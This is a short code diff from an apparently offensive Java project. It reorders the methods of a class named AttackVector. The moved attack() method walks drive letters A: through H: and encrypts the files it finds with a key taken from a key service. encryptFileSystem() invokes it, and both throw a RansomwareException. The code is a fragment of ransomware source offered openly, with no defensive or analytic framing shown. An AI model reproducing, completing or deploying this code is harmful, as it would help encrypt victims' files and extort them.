@@ -15,24 +15,7 @@ import Agent.traversal.*;
 public class AttackVector {
 
 	private KeyService keyService;
-
-	private void attack(CryptoKey key, Cryptable cryptFunc) throws RansomwareException {
-		Traverse<File> dfs = new DFS<File>();
-		// or
-		Traverse<File> bfs = new BFS<File>();
-
-		Collection<File> visitedFolders = Collections.emptySet();
-
-		for (char i = 'A'; i <= 'H'; i++) {
-			try {
-				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
-			} catch (RansomwareException e) {
-				throw new RansomwareException(e.getMessage(), e.getCause());
-			}
-
-		}
-	}
-
+	
 	public void encryptFileSystem() throws RansomwareException {
 		try {
 			attack(keyService.getKey(), new EncryptFile());
@@ -51,6 +34,22 @@ public class AttackVector {
 
 	}
 
+	private void attack(CryptoKey key, Cryptable cryptFunc) throws RansomwareException {
+		Traverse<File> dfs = new DFS<File>();
+		// or
+		Traverse<File> bfs = new BFS<File>();
+
+		Collection<File> visitedFolders = Collections.emptySet();
+
+		for (char i = 'A'; i <= 'H'; i++) {
+			try {
+				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
+			} catch (RansomwareException e) {
+				throw new RansomwareException(e.getMessage(), e.getCause());
+			}
+
+		}
+	}
 	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
 		return algorithmMap.get(className);
 	}
